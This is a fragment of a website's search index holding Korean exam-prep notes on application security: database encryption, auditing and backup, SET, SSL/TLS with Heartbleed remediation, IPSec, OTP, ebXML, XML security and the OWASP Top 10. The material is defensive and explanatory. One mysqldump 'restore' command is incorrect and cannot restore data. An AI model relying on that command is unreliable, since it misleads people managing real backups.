                  데이터베이스 서버에 별도의 암호화 솔루션을 설치           애플리케이션이 데이터 조작어(insert, update, select 등)를 실행하면 암호화하거나 복호화                       API 방식                    애플리케이션에서 암호화 API를 호출하여 암호화를 수행           암호화가 필요한 애플리케이션을 모두 수정해야 함                           특징            기업의 중요 데이터를 암호화하여 저장하는 솔루션       두 가지 형태의 암호화를 제공                    특정 테이블에 데이터를 저장하면 암호화 솔루션이 해당 테이블 혹은 컬럼을 암호화           데이터베이스 암호화 솔루션이 제공하는 API를 호출하면 암호문을 제공하여 암호화를 수행                       가장 큰 이슈는 데이터를 암복호화할 때 얼마나 빠른 성능을 제공하는지의 여부       DB에 저장되어 있는 패스워드는 무조건 암호화를 수행해야 하며 암호화 방식도 복호화가 될 수 없는 일방향 암호화를 수행           2. 데이터베이스 감사 솔루션     개념            데이터베이스의 모든 접근에 대해서 로그를 기록하여 추적성을 확보       SQL 실행 시 그 로그를 모두 기록, 관리           장점            스니핑 서버가 죽어도 업무에 지장이 없음       운영서버에 부담이 없음           단점            Packet Loss가 있음       접근 제어가 안 됨           방식            스니퍼 소프트웨어 활용                    Packet Loss가 발생                       T-Sensor 라는 별도의 하드웨어를 활용, 네트워크 선로를 연결                    해당 네트워크 선로로 유입되는 패킷(Packet)을 하드웨어에 복제           실제 기업에서 많이 사용하는 방식           Log 기록에 따른 성능저하를 최소화                           3. 데이터베이스 접근 제어 솔루션     개념            권한이 없는 사용자가 데이터베이스 접근을 시도할 때 이를 차단       사용자 ID와 PW 를 발급받고 해당 사용자 컴퓨터의 IP 주소를 등록해서 접근 제어를 수행           장점            다중 인스턴스에 대해 통제 가능한 독립된 서버       DB 단위의 접근 제어       데이터베이스 접근에 대한 통제와 로그를 가장 완벽하게 관리           단점            독립된 서버이기 때문에 이중화 구성 필요       Telnet을 통하여 접근하는 SQL 명령에 대해서는 통제가 어려움       우회해서 접근할 수 있으므로 보안 허점이 발생       기업에서 잘 사용하지 않는 방식                    접근 제어 솔루션을 통해서만 DB 접근 가능 - 성능 저하                           4. 데이터베이스 암호화 및 접근 통제                  구분       내용                       사용자 인증(Authentication)       ⦁ 암호나 개인 신분 번호를 확인 ⦁ 그 사용자만 가지고 있는 물건 제시 : 카드, 배지, 키 등 ⦁ 사용자의 신체적 특징을 이용하는 방법 : 지문, 홍채 등 ⦁ 사용자만이 알고 있는 함수(Function)를 이용하는 방법                 권한 부여(Authorization)       ⦁ 인증 과정을 거친 사용자를 대상으로 사용자가 해당 데이터 항목에 대한 연산을 수행할 권한이 있는지 확인하는 과정 ⦁ 사전에 사용자/데이터 항목별 권한 부여 테이블을 유지                 암호화(Encryption)       데이터의 내용을 암호화함으로써 불법적으로 데이터 취득 시 해독이 불가능하도록 하기 위함           데이터베이스 백업          백업 방법                                  백업 방법           월요일           화요일           수요일           목요일           금요일           토요일           일요일                                           전체 백업           전체 백업           전체 백업           전체 백업           전체 백업           전체 백업           전체 백업           전체 백업                             증분 백업           전체 백업           인사           급여           복지           주문           계좌           고객                             차등 백업           전체 백업           인사           인사,급여           인사,급여,복지           인사,급여,복지,주문           인사,급여,복지,주문,계좌           인사,급여,복지,주문,계좌,고객                                  전체 백업 (Full Backup)                    데이터베이스 전체를 백업받는 것           가장 단순한 형태, 간단한 방법           매일 전체 백업을 받으면 시간과 공간이 많이 필요                       차등 백업 (Differental Backup)                    가장 최근 전체 백업을 받은 후 이후에 변경된 모든 것을 백업                       증분 백업 (Incremental Backup)                    마지막 백업 이후 변경된 것만 백업           저장 매체의 효율적 이용           복구 시 많은 매체가 필요                                mysqldump를 통한 MySQL 백업             mysqldump -u root -p 1234 test &gt; test.sql : SQL문을 Text 형태로 백업       mysqldump -u root -p 1234 test &lt; test.sql : 데이터 복구          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","애플리케이션 보안","데이터베이스 보안"],
        "url": "https://bluesplatter.com/is_certification/ISCert-03Application-02DB/",
        "teaser": null
      },{
        "title": "03.애플리케이션 보안 - 03.전자상거래 보안",
        "excerpt":"전자화폐  1. 전자화폐     디지털 서명이 있는 금액 가치 정보   IC칩 내장 카드나 공중정보통신망과 연결된 PC 등의 전자기기에 전자기호 형태로 화폐적 가치를 저장하였다가 상품 등의 구매에 사용할 수 있는 전자적 지급수단   2. 전자화폐 요구조건     불추적성(사생활 보호, 익명성)   오프라인성 : 은행에 접속하지 않아도 여러 가지 암호 프로토콜을 통해 검사가능   가치이전성(양도성) : 다른 사람에게 즉시 이전 가능   분할성 : 그 가치만큼 자유롭게 분할 사용   독립성(완전 정보화) : 다른 물리적 매체에 의존해서는 안 되며, 디지털 데이터 자체로서 완벽한 화폐가치를 가져야 함   이중사용 방지(복사 및 위조 방지)   익명성 취소 : 돈 세탁, 돈 약탈, 불법 구매자금 등 부정한 방법으로 그 기능이 전용될 수 있으므로 법원과 같은 공정한 기관의 명령에 의해 사용자의 식별 값이 노출될 수 있어야 함   3. IC 카드형 전자화폐 종류                  전자화폐 종류       주요 내용                       몬덱스       ⦁ 가장 대표적인 전자화폐 시스템 ⦁ 현금 지불의 장점과 카드 지불의 편리함을 결합 ⦁ 5개국 통화로 가치를 저장할 수 있음 ⦁ 해외 사용 및 송금과 외환거래 가능                 비자캐시       ⦁ 소액 지불을 위한 지불수단 ⦁ 11개국에서 사용                 PC Pay       스마트카드와 카드 리더기로 구성된 PC Pay Device와 Interface Software로 구성                 Ecash       Dig Cash사에서 개발된 전자화폐 시스템으로 은닉서명 기술을 사용하여 온라인상에서 완전한 익명성을 제공                 Net Cash       전자수표 등의 금융도구와 교환이 가능한 분산 Currency Server를 기반으로 하며, 전자화폐로 바꾸어 사용 가능              FDS(Fraud Detection System)            전자금융거래에서 사용되는 단말정보, 접속로그, 거래정보 등을 분석       각종 부정 거래행위를 탐지, 예방 (탐지통제, 예방통제)           가상화폐 비트코인(Bitcoin)            2009년 나카모토 사토시가 만든 디지털 통화       중앙관리 장치가 없으며 P2P(Peer to Peer) 기반의 분산 데이터로 이루어져 있음       공개 키 암호방식을 사용해서 거래       지갑파일의 형태로 저장 관리되고 지갑에는 고유의 ID가 부여됨           SET  1. SET(Secure Electronic Transaction)     인터넷에서 신용카드 사용 촉진을 위해 VISA와 MASTER CARD 사에서 공동 개발한 프로토콜   전자 상거래 인증의 상호 작용을 보장, SSL에 비해 상대적으로 느림   전자 서명과 인증서를 통한 안전한 거래가 가능   신용카드의 지급 결제 처리 절차에 한해서 정의, 시스템 구축 및 인증 절차가 복잡함   기밀성, 무결성, 인증, 부인봉쇄를 지원   이중서명으로 가맹점과 카드 소유자 정보를 분리해서 서명   2. SET 거래 절차      거래절차      이미지 출처   3. 세부 절차      전자봉투에 대해      이미지 출처           구매자가 웹 사이트에서 물건을 구매하며 검증 정보를 준비              이미지 출처              이미지 출처              구매자(Card Holder)가 상점(Merchant)의 웹 사이트서 상품을 선택       구매자가 상점의 인증서를 수신, 상점 검증       구매자가 아래의 정보를 상점에게 전송                    자신의 인증서           암호화된 구매정보 = 상점의 공개키로 암호화된 구매정보           암호화된 결제정보 = 대칭키로 암호화된 결제정보           검증해시값 = hash(구매정보), hash(결제정보)           전자 서명 = 검증해시값 을 고객의 개인키로 암호화한 정보           대칭키를 담은 전자봉투 = 결제정보를 암호화한 대칭키를 PG사의 공개키로 암호화한 정보                                상점의 검증              이미지 출처              상점은 구매자의 인증서를 수신, 구매자 검증       상점은 구매 정보 복호화       구매 정보에 해시를 생성       새로 생성한 해시와 전달받은 hash(구매 정보)의 일치 확인       고객의 공개키로 전자서명을 풀어봄       전자서명을 풀어 나온 값이 검증 해시값과 같은지 확인                PG사의 검증              이미지 출처              상점으로부터 검증 정보 중 구매정보를 제외한 나머지 정보를 받음       PG사는 전자봉투를 자신의 개인키로 복호화       대칭키를 받아서 암호화된 결제 정보를 복호화       결제정보에 hash를 적용       새로 생성한 해시와 전달받은 hash(결제 정보)의 일치를 확인       고객의 공개키로 전자서명을 풀어봄       전자서명을 풀어서 나온 값이 검증 해시값과 같은지 확인       은행에 대금지급을 요청           4. SET 구성요소                  구성요소       세부 내용                       구매자(카드 소지자)       전자상거래를 수행하는 전자지갑(사용자 신분을 확인하는 SET 인증서 포함)을 얻음                 판매자(상점 소유자)       웹상의 상품 운영자, SET를 이용하여 상품 판매를 제공                 PG(Payment Gateway)       기존의 카드 지불 네트워크의 통로                 발급기관(Issuer)       ⦁ 사용자 계좌가 있는 재정 기관으로 신용카드를 발행 ⦁ CA 운영하여 사용자에게 인증서를 발행                 지불처리은행(Acquirer)       ⦁ 상점의 계좌가 있는 재정 기관으로 신용카드 인가 여부와 지불을 처리 ⦁ 지불 Gateway를 운영하고 CA를 운영하여 상인에게 인증서를 발행                 인증기관(Certification Authority)       SET에 참여하는 사용자, 상점, PG의 정당성을 보증하는 기관              SET 사용 기술            대칭키, 공개키, 전자서명, 해시함수, 전자봉투, 공개키 인증(X.509), 이중서명       알고리즘 : DES, RSA, SHA-1           5. SET 이중서명 (Dual Signature)     SET 이중서명 사용 이유            사용자는 판매자에게 지불정보(계좌 정보)를 숨기고 싶다.       사용자는 PG로부터 주문정보(물품명세서 등)를 숨기고 싶다.       PG(Payment Gateway)는 판매자가 전송한 결제요청이 실제 고객이 의뢰한 정보인지 확인하고 싶다.                  이미지 출처              주문정보와 지불정보를 각각 해시하고 생성된 두 개의 해시 다이제스트를 하나로 합치는 연접 과정 후에 또 다시 해시를 진행하고, 해시 다이제스트를 송신자의 개인키로 암호화한다.           SET 장점과 단점            장점                    전자상거래의 사기 방지, 기존의 신용카드 기반을 그대로 활용                       단점                    암호 프로토콜이 너무 복잡함           RSA 속도 저하, 카드 소지자에게 전자지갑 소프트웨어를 요구                           SSL  1. SSL(Secure Socket Layer) 개요  1. 개요     개인정보를 전송하는 네트워크 구간은 보안서버를 사용해서 송신 및 수신되는 데이터를 암호화해야함 - 스니퍼(Sniffer) 와 같은 네트워크 패킷 모니터링 도구를 통한 스니핑 방지   보안서버의 구축은 SSL 및 SSO 등으로 구축할 수 있으며 공개용 인터넷에서 사용하는 방식은 SSL임   2. SSL(Secure Socket Layer)     인터넷과 같은 개방환경에서 Client와 Server의 안전한 통신을 목적으로 Netscape 사에서 개발   암호문 전송을 위해 RSA 공개키 알고리즘을 사용   X.509 인증서 지원   443 포트 사용   Transport ~ Application 계층에서 동작 (http, ftp, telnet, mail)   기밀성, 무결성, 인증의 세 가지 보안 서비스를 제공   3. SSL 보안 서비스                  보안 서비스       세부 내용                       인증(Authentication)       거래하고자 하는 사이트가 신뢰할 수 있으며 검증된 사이트인지 개인정보를 송신하기 전에 먼저 상대 사이트를 인증하는 기능                 무결성(Integrity)       송신자 측의 웹브라우저에서 상대편 웹 서버까지 송신 중 공격자나 제 3자에 의해 무단으로 데이터가 위변조 되는 것을 방지하는 기능                 기밀성(Confidentiality)       앞서 나온 DES, 3DES, IDEA 등 여러 가지 암호화 방식을 사용하여 데이터의 송 수신 중에 인가되지 않은 사용자의 데이터에 대한 불법적인 접근을 통제하고 만일의 경우 데이터가 공격에 의하여 유출되었다 하여도 쉽게 읽힐 수 없는 형태로 변환시키는 기능           4. SSL Handshaking 과정     웹 브라우저는 SSL 요청 전에 웹 서버 포트인 443 포트를 호출하여 TCP 3-Way Handshaking을 수행   웹 브라우저는 TCP 연결이 완료되면 웹 서버에게 “Client Hello” 를 전송            웹브라우저에서 지원하는 SSL 버전 (예:TLS 1.0)       지원하는 암호화 알고리즘(예:AES 대칭키 및 CBC블록 암호화 등)       Random : 재생공격(Replay Attack) 방지를 의한 임의적 숫자           서버는 웹 브라우저에게 “Server Hello” 를 전송            웹 서버가 암호화 알고리즘을 결정해서 웹 브라우저에게 전송           웹브라우저는 최종적으로 “Change Cipher Spec” 을 서버에 전송            웹브라우저가 협의된 암호화 알고리즘을 사용한다는 것을 알림           5. SSL 구성요소                 SSL 아키텍처 구조                   SSL Handshake Protocol         SSL change Cipher Spec Protocol         SSL Alert Protocol         Application Protocol(ex.HTTP)                   SSL Record Protocol                   TCP                   IP                       구성요소       세부 내용                       Change Cipher Spec Protocol       Handshake Protocol 에서 협의된 암호 알고리즘, 키 교환 알고리즘, MAC 암호화, HASH 알고리즘이 사용될 것을 클라이언트와 웹 서버에게 공지                 Alert Protocol       ⦁ SSL 통신을 하는 도중 클라이언트와 웹 서버 중 누군가의 에러나 세션의 종료, 비정상적인 동작이 발생할 때 사용되는 프로토콜 ⦁ 첫 번째 바이트에 위험도 수준을 결정하는 Level 필드가 있음. 1인 경우 Warning의 의미로 통신의 중단은 없고 2인 경우 Fatal로 Alert 즉시 클라이언트와 서버의 통신을 중단하게 됨 ⦁ 두 번째 바이트에는 어떠한 이유로 Alert Protocol이 발생하였는지 나타내는 Description 필드가 있음                 Record Protocol       ⦁ 상위 계층에서 전달받은 데이터를 Handshake Protocol에서 협의가 이루어진 암호 알고리즘, MAC 알고리즘, HASH 알고리즘을 사용해 데이터를 암호화 ⦁ 산출된 데이터를 SSL에서 처리가 가능한 크기의 블록으로 나누고 압축 ⦁ 선택적으로 MAC(Message Authentication Code)를 덧붙여 전송 ⦁ 수신한 데이터는 복호화, MAC 유효성 검사, 압축 해제, 재결합의 과정을 거쳐 상위 계층에 전달           2. SSL Handshaking Protocol 과정  1. SSL Handshaking Protocol 세부 과정                  진행 과정       세부 내용                       Client Hello       Handshake Protocl 의 첫 단계로 클라이언트의 브라우저에서 지원하는 암호 알고리즘, 키 교환 알고리즘, MAC 암호화, HASH 알고리즘을 서버에 전송                 Server Hello       Client Hello 메시지 내용 중 서버가 지원할 수 있는 알고리즘들을 클라이언트에게 전송                 Server Hello Done       클라이언트에게 서버의 요청이 완료되었음을 공지                 Client 인증서       서버에서 클라이언트의 인증 요청 발생 시 클라이언트의 인증서를 전달                 Premaster Key 전송       전달받은 서버의 인증서를 통해 신뢰할 수 있는 서버인지 확인 후 암호 통신에 사용할 Session Key를 생성하고 이것을 서버의 공개키로 암호화해 Premaster Key를 만들어 서버로 전송                 Change Cipher Spec       앞의 단계에서 협의된 암호 알고리즘들을 이후부터 사용한다는 것을 서버에게 알림                 Finished       서버에게 협의 종료를 전달                 Change Cipher Spec       서버 또한 클라이언트의 응답에 동의하고 협의된 알고리즘의 적용을 공지                 Finished       클라이언트에게 협의에 대한 종료를 선언              SSL 버전은 SSL 3.0 이상, TLS 1.1 이상을 사용해야 보안 취약점에 문제가 없음   2. OpenSSL 사용     웹서버에 OpenSSL 패키지를 설치하고 개인키와 인증서를 생성한다.            웹브라우저는 변경 없이 SSL 사용 가능           웹서버는 개인키를 최소 길이 2048 이상으로 생성한다.   3. OpenSSL 보안 취약점     하트블리드(HeartBleed) 취약점            OpenSSL 암호화 라이브러리(Library)의 하트비트(Heartbeat) 라는 확장모듈에서 발생한 문제       웹 브라우저가 요청(Request)했을 때 데이터 길이를 검증하지 않아 메모리에 저장되어 있는 평문의 64KB 가 노출되는 현상           해결법            OpenSSL 버전을 1.0.1g 버전으로 업데이트       Heartbeat를 사용하지 않도록 재컴파일           ./config -DOPENSSL_NO_HEARTBEATS   make depend   make   make install                       취약점 공격 탐지 및 차단 패턴 적용       서버 측 SSL 비밀키(Secret Key)가 유출되었을 가능성이 있기 때문에 인증서 재발급을 검토       취약점 조치 완료 후, 사용자들의 비밀번호 재설정을 유도하여 탈취된 계정을 악용한 추가 피해 방지 방안 고려           sHTTP  1. sHTTP 개요     메시지를 안전하게 전송하기 위해 사용   웹 상의 파일들이 안전하게 교환될 수 있도록 해주는 HTTP의 확장판 (HTTP만 지원)   HTTP를 캡슐화, HTTP와 같은 message base 프로토콜   HTTP와 동일한 요청과 응답 구조를 이용   SSL이 전송 계층에 작동하는 것에 비해 S-HTTP는 응용 계층에서 보안 기능을 제공하므로 더 효율적임   2. sHTTP 기능     전용 웹브라우저와 웹서버를 사용   기밀성, 무결성, 전자서명 기능 지원   sHTTP는 웹브라우저와 웹서버 사이 암호화 방식, CA 선택 등의 기능을 제공   IPSEC  1. IPSEC(IP Security) 개요     IPSEC(IP Security)            인터넷상에 전용 회선처럼 이용 가능한 가상 전용 회선을 구축, 안전한 통신을 실현하는 통신 규약                IPSEC 전송 방법                                  종류           설명                                           터널 모드           VPN과 같은 구성으로 패킷의 출발지에서 일반 패킷이 보내지면 중간에서 IPSec을 탑재한 중계 장비가 패킷 전체를 암호화(인증)하고 중계 장비의 IP 주소를 붙여 전송, IP 헤더까지 암호화                             전송 모드           패킷의 출발지에서 암호화(인증)를 하고 목적지에서 복호화가 이루어지므로 End-to-End 보안을 제공, 메시지만 암호화                           2. IPSEC Header 구조          IPSEC 인증 및 암호화를 위한 헤더                                  종류           설명                                           AH(Authentication Header)           ⦁ 데이터 무결성과 IP 패킷의 인증을 제공, MAC 기반 ⦁ Replay Attack으로부터 보호 기능(순서번호 사용)을 제공 ⦁ 인증 시 MD5, SHA-1 인증 알고리즘을 이용하여 Key 값과 IP 패킷의 데이터를 입력한 인증 값을 계산하여 인증 필드에 기록 ⦁ 수신자는 같은 키를 이용하여 인증 값을 검증                             ESP(Encapsulating Security Payload)           ⦁ 전송 자료를 암호화하여 전송하고 수신자가 받은 자료를 복호화하여 수신 ⦁ IP 데이터그램에서 제공하는 기능이며 데이터의 선택적 인증, 무결성, 기밀성, Replay Attack 방지를 위해 사용 ⦁ AH와 달리 암호화를 제공(대칭키, DES, 3-DES 알고리즘) ⦁ TCP/UDP 등의 Transport 계층까지 암호화할 경우 Transport 모드 ⦁ 전체 IP 패킷에 대해 암호화할 경우 터널 모드를 사용                                IPSEC 키 관리                                  종류           설명                                           ISAKMP           ⦁ Internet Security Assiociation and Key Management Protocol ⦁ Security Association 설정, 협상, 변경, 삭제 등 SA 관리와 키 교환을 정의했으나 키 교환 메커니즘에 대한 언급은 없음                             IKE           ⦁ IKE(Internet Key Exchange) 메시지는 UDP 프로토콜을 사용해서 전달되면 출발지 및 도착지 주소는 500port를 사용하게 됨 ⦁ 키 교환 담당                           OTP  1. OTP(One Time Password) 개요     OTP(One Time Password)            OTP 생성 매체에 의해 필요한 시점에 발생하고 매번 다른 번호로 생성되는 높은 보안수준을 가진 사용자 동적 비밀번호       사용된 비밀번호는 일회성으로서 다시 생성되지 않음                OTP의 동기 및 비동기식 방식                                  구분           방식           단계                                           동기식           시간, 이벤트           ⦁ Time 동기화 Token은 정해진 고정된 시간 간격 주기로 난수 값 생성 ⦁ 난수 값 생성을 위한 특별한 암호화 알고리즘과 비밀키가 필요 ⦁ 토큰 장치로부터 새로 생성된 난수와 개인의 PIN 번호를 입력하면 인증시스템 내의 사용자 개인정보와 생성된 패스워드를 검증하여 인증                             비동기식           질의응답           ⦁ 사용자가 인증 요구와 함께 PIN을 전송하면 인증서버는 난수를 발생하여 Challenge로 사용자에게 전달 ⦁ 사용자는 다시 Challenge 값을 암호화하여 Response를 반환하면 인증 서버는 자신의 결과값과 비교하여 인증 ⦁ 단점 : 느림, 복잡 ⦁ 장점 : 안정성이 매우 우수                           2. 동기 방식과 비동기 방식 인증 방법          동기화 방식              이미지 출처              사용자의 OTP 생성 매체와 은행의 OTP 인증서버 사이에 동기화된 기준값에 따라 OTP가 생성되는 방식       동기화된 기준값에 따라 시간 동기화방식과 이벤트 동기화방식으로 분류됨       시간 동기화 방식은 OTP 생성 매체가 매시간 비밀번호를 자동으로 생성하는 형태로 시간을 기준값으로 하여 OTP 생성 매체와 OTP 인증서버가 동기화됨       시간을 입력값으로 동기화하기 때문에 간편한 장점을 가지지만, 일정 시간 동안 은행에 OTP를 전송하지 못하면 다시 새로운 OTP가 생성될 때까지 기다려야 함       이벤트 동기화 방식은 OTP 생성 매체와 인증서버의 동기화된 인증횟수를 기준값으로 생성, OTP 생성 매체에서 생성된 비밀번호 횟수와 인증서버가 생성한 비밀번호 횟수가 자동으로 동기화되기 때문에 시간 동기화의 불편성을 완화                비동기 방식 : 질의응답(Challenge-Response)              이미지 출처              사용자의 OTP 생성 매체와 은행의 OTP 인증 서버 사이에 동기화되는 기준값이 없으며 사용자가 직접 임의의 난수(질의 값)를 OTP 생성 매체에 입력하여 OTP를 생성하는 방식       사용자가 은행의 OTP 인증서버로부터 받은 질의 값(Challenge)을 OTP 생성 매체에 직접 입력하면 응답 값(Response)이 생성됨       사용자가 직접 OTP 생성 매체에 질의 값을 입력해야 하며, 응답 값인 OTP가 생성되기 때문에 전자금융 사고 발생 시 명백한 책임소재를 가릴 수 있고 보안성도 높은 방식       직접 질의 값을 확인하여 OTP 생성 매체에 입력해야 하므로 은행이 별도의 질의 값을 관리해야 함           전자문서와 ebXML  1. 전자문서(Electronic Documents) 개요     전자문서(Electronic Documents)            전자상거래 시 비즈니스 거래를 위해 활용되는 문서로 비즈니스 정보 개체의 집합                전자문서 유형                                  유형           세부 내용                                           EDI(Electronic Document Interchange)           ⦁ 기업 간의 전자상거래 시 전자문서를 교환하기 위한 문서화 표준 ⦁ UN/EDIFACT 표준을 준수                             XML/EDI           XML 문서를 인터넷을 활용해서 전자문서를 교환하는 개방형 표준                             XMI(eXtensible Markup Interchange)           W3C에서 제안한 것으로 웹에서 구조화된 문서를 교환하기 위한 웹 표준                             ebXML(e-business Extensible Markup Language)           UN/CEFACT와 OASIS에서 표준화한 기업 간의 전자상거래 프레임워크                           2. ebXML(e-business Extensible Markup Language) 개요          ebXML 전자상거래 방법              이미지 출처              기업 A가 기업 B와 전자상거래를 위해 ebXML 저장소에 비즈니스 상세항목을 요청       비즈니스 상세항목은 기술적 요소와 비즈니스적 요소로 이루어짐       기업 A는 ebXML로부터 상세항목을 받고 기업 A의 정보시스템을 개발       구현된 상세항목과 기업 A의 기업정보를 다시 ebXML 저장소에 저장       기업 B와 전자상거래를 위한 계약을 체결       기업 B는 기업 A의 정보를 얻어 전자상거래가 이루어짐       비슷한 예 : Biztalk                ebXML 구성요소                                  구성요소           세부 내용                                           비즈니스 프로세스 (Business Process)           ⦁ 비즈니스 거래 절차에 대한 표준화된 방법 ⦁ 모델링을 통해서 비즈니스 프로세스를 표현하는 방법을 정의                             핵심 컴포넌트 (Core Components)           비즈니스에서 교환되는 전자문서를 재사용할 수 있도록 표준화 작업을 수행                             등록저장소 (Registry Repository)           ⦁ 거래 당사자들에 의해 제출된 정보를 저장 ⦁ 메타 데이터 저장소                             거래 당사자 (Trading Partners)           ⦁ 비즈니스 거래 당사자에 대한 정보 및 협업을 위한 프로파일 ⦁ 협업 규약 프로파일, 협업 규약 약정서                             전송,교환 및 패키징 (Transport,Routing and Packaging)           ebXML 메시지를 상호운영, 보안, 전달을 위한 표준                           Web Service와 XML(eXtensible Markup Language) 보안  1. 웹 서비스(Web Service) 개요     웹 서비스(Web Service)            인터넷 표준 기술(WSDL, SOAP, UDDI, XML)을 활용하여 기업 내부 및 기업 외부의 정보시스템을 상호연계하기 위한 기술                Web Service 처리 방법              이미지 출처            Web Service 표준기술                                  표준기술           세부내용                                           WSDL(Web Service Description Language)           서비스 제공자와 서비스 사용자 간의 웹 서비스 파라미터의 이름, 서비스가 위치한 URL 및 웹 서비스 호출에 관한 정보를 기술하는 표준                             UDDI(Universal Description, Descovery and Integration)           서비스 제공자가 웹 서비스를 등록하고 서비스 사용자가 웹 서비스를 검색하기 위한 레지스트리                             SOAP(Simple Object Access Protocol)           XML을 기반으로 하는 메시지 표준으로 서비스 사용자가 서비스 제공자에 의해서 노출된 웹 서비스를 호출하고 결과를 받기 위한 표준 프로토콜                           2. XML(eXtensible Markup Language) 보안 기술          Web Service 및 XML 보안 기술                                  보안 기술           세부 내용                                           XML 전자서명 (Digital Signature)           XML 문서에 대해서 Element 단위 혹은 문서단위 전자서명                             XML 암호화 (Encryption)           XML 문서에 대한 대칭키 및 공개키 기반 암호화 수행                             XACML (eXtensible Access Control Markup Language)           ⦁ 정보자원에 대한 접근정책을 정의한 표준 XML 문서 ⦁ 접근 통제 정책 정의함                             XKMS (XML Key Management Specification)           공개키 관리를 위한 공개키 획득, 검증, 키 등록, 폐기와 같은 메커니즘 제공                             SAML (Security Assertion Markup Language)           Security Token 형태로 인증에 필요한 권한정보                           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","애플리케이션 보안","전자상거래 보안"],
        "url": "https://bluesplatter.com/is_certification/ISCert-03Application-03eCommerce/",
        "teaser": null
      },{
        "title": "03.애플리케이션 보안 - 04.기타 애플리케이션 보안",
        "excerpt":"웹 취약점 및 버그 유형  1. OWASP Top 10     OWASP(The Open Web Application Security Project)            신뢰성 있는 웹 애플리케이션 개발 및 운영을 위한 웹 취약점의 우선순위와 위험도 기준의 정보보안 가이드라인을 제시           1. 인젝션     개요            SQL, OS, XXE, LDAP 인젝션 취약점       적절한 입력 유효성 검사 없이 신뢰할 수 없는 데이터가 명령이나 쿼리문의 일부분으로 인터프리터로 전송될 때 발생       예상치 못한 명령 실행, 접근권한 없이 데이터 접근 등의 문제 발생           대응방안            서버 측 입력 검증, 특수문자 필터링 및 유효성 검사       화이트리스트 조합 사용           2. 취약한 인증     개요            인증 및 세션관리 관련 애플리케이션 기능이 잘못 구현됨       공격자에게 취약한 암호, 세션 토큰 등을 제공       다른 사용자의 권한을 얻어 익스플로잇(Exploit)           대응방안            멀티팩터 인증 구현       기본 자격 증명 사용 금지       높은 수준의 암호 정책 구현       지연 로그인, 무작위 세션 ID, 세션 시간 초과 등등으로 제어       실패한 로그인 시도 기록(Log)           3. 민감한 데이터 노출     개요            중요한 정보를 제대로 보호하지 않음       암호화되어야 하는 정보들을 일반 텍스트로 노출           대응방안            데이터를 중요도에 따라 분류       암호화 적용, 적절한 키 관리 및 표준 알고리즘 사용       불필요한 데이터, 민감한 데이터를 포함하는 응답을 회피       캐싱 비활성화           4. XML 외부 개체(XXE)     개요            잘못된 설정, 오래된 XML프로세서는 XML 문서 내에서 외부 개체를 참조함       내부 시스템 스캔, 포트 스캔, 원격코드 실행, 서비스 거부 공격, 데이터 추출 등의 작업 가능           대응방안            서버 입력 유효성 검증, 필터링, 검사       모든 XML파서의 XML 외부 개체와 DTD 처리 비활성화       JSON과 같은 덜 복잡한 형식 사용, 중요한 데이터의 연속화 방지, 모든 XML 프로세스 및 라이브러리 패치 (SOAP 1.2이상)           5. 취약한 접근 통제     개요            인증된 사용자가 수행할 수 있는 작업에 대한 제한이 제대로 적용되지 않을 때 발생       결함을 악용하여 타 사용자 계정에 접근 혹은 중요 파일 노출, 데이터 수정, 접근권한 변경이 가능           대응방안            배타적 자원허용       액세스 제어 실패 및 알림 로그 유지       교차 출처 리소스 공유(Cross-Origin Resource Sharing, CORS) 사용 최소화           6. 잘못된 보안 구성     개요            응용 프로그램의 데이터를 안전하게 유지하는 제어장치의 부적절한 구현       보안 헤더를 잘못 설정       민감한 정보를 노출하는 오류메시지       패치 또는 업그레이드 시스템을 무시, 기본 구성을 사용           대응방안            불필요하고 사용되지 않는 기능 또는 프레임워크 제거       안전한 설치 프로세스 구현       제로 트러스트 모델 (내/외부를 막론하고 적절한 인증 절차 없이 누구도 신뢰하지 않음)을 구현                    보호가 필요한 자산 및 데이터                       사용자 권한 검토 및 업데이트           7. 크로스사이트 스크립팅(XSS)     개요            다른 사람의 웹 응용 프로그램의 페이지 출력에 스크립트를 주입       브라우저는 페이지의 일부로 믿고 스크립트를 실행       예) 링크를 클릭하면 피해자의 웹 브라우저에서 스크립트가 실행되어 세션, 쿠키, 사용자 자격 증명을 훔치거나 악성코드를 전달           대응방안            상황에 맞는 인코딩을 적용       엔티티 적용           8. 안전하지 않은 역직렬화     개요            직렬화 개념 : 응용 프로그램 코드에서 객체를 바이트 스트림으로 변환하거나 디스크에 저장하는 등의 다른 용도로 사용할 수 있는 형식으로 변환       역직렬화 과정 중 DoS 공격이나 원격 코드 실행과 같은 심각한 결과를 초래할 수 있도록 변조되는 것을 말함           대응방안            악성객체 생성이나 데이터 변조 방지를 위해 직렬화된 객체에 대한 디지털서명과 같은 무결성 검사를 구현       엄격한 형식 제약 조건을 적용       낮은 권한의 환경에서 코드를 분리하여 실행       모니터링하면서 예외와 오류를 기록           9. 알려진 취약점이 있는 구성요소 사용     개요            라이브러리 등의 구성요소를 사용하면서 검증하지 않거나 해당 요소의 업데이트된 버전을 사용하지 않고 특정 기능을 구현하는 광범위한 문제           대응방안            클라이언트 및 서버 측 구성요소의 종속성과 함께 버전 업데이트, 패치           10. 불충분한 로깅 및 모니터링     대응방안            위심스러운 활동 (로그인 실패, 엑세스 제어 실패, 입력 유효성 검사 실패) 을 기록, 중앙 집중식 로그관리 솔루션 이용       변조 또는 삭제를 방지하기 위한 감사 시스템           2. 주요 정보통신기반시설 취약점 분석, 평가기준 고시     주요 정보통신기반시설로 지정된 첫 회는 지정 후 6개월 이내에 취약점 분석 및 평가를 실시해야 한다.            6개월 이내 취약점 분석 및 평가를 수행치 못할 경우 관할 중앙행정기관의 장의 승인을 얻어 3개월 연장 가능하다.           웹 취약점 및 버그 방지 개발 방법  1. 소프트웨어 개발 보안(보안 약점)     안전한 소프트웨어 개발을 위해, 소스코드 등에 존재할 수 있는 잠재적인 보안 약점 제거, 보안을 고려한 기능 설계, 구현 등 SDLC(Software Development Life Cycle) 전반에서 수행하는 일련의 보안 활동        SDLC 단계별 소프트웨어 개발 보안 활동                                  1.요구사항 분석           2.설계단계           3.구현단계                                           보안 항목 요구사항 식별 ⦁ 암호화해야 할 중요 정보 ⦁ 중요 기능에 대한 분류(시스템 리부팅) 보안 요구 항목 20개-세분화 54개           위협원 도출 ⦁ 위협 모델링: 보안 전문가, 개발 전문가 ⦁ 전문방법론(도구):MS 등에서 제공 ⦁ 분석/설계 20개, 구현 54개의 위협원이 반영될 수 있도록 설계           표준 코딩, SW 개발 보안 가이드 준수 ⦁ 구현단계에서 준수할 수 있도록 설계단계에서 가이드 개발 가이드 제공 ⦁ 개발 